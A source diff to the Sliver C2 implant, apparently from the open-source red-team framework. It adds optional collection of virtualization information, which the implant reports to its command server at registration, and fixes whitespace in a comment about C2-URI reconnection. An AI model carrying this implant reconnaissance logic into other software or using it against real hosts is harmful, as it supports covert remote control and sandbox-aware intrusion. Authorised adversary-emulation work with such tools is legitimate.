@@ -44,7 +44,9 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-
+	// {{ if .Config.CollectVirtualizationInfo }}
+	"github.com/bishopfox/sliver/implant/sliver/virtualization"
+	// {{end}}
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
 	"google.golang.org/protobuf/reflect/protoreflect"
@@ -299,7 +301,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 			// Short circuit current duration with no error
 		}
 
-		// check if reconfig used to set a new C2-URI 
+		// check if reconfig used to set a new C2-URI
 		if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
 			// {{if .Config.Debug}}
 			log.Printf("[beacon] C2 URI changed to %s, reconnecting...", c2)
@@ -765,6 +767,14 @@ func registerSliver() *sliverpb.Register {
 	log.Printf("Host Uuid: %s", uuid)
 	// {{end}}
 
+	var virt string
+
+	// {{ if .Config.CollectVirtualizationInfo }}
+	virt = virtualization.GetVirtualizationInfo()
+	// {{ else }}
+	virt = ""
+	// {{ end }}
+
 	return &sliverpb.Register{
 		Name:              consts.SliverName,
 		Hostname:          hostname,
@@ -781,5 +791,6 @@ func registerSliver() *sliverpb.Register {
 		ConfigID:          "{{ .Config.ID }}",
 		PeerID:            pivots.MyPeerID,
 		Locale:            locale.GetLocale(),
+		Virtualization:    virt,
 	}
 }
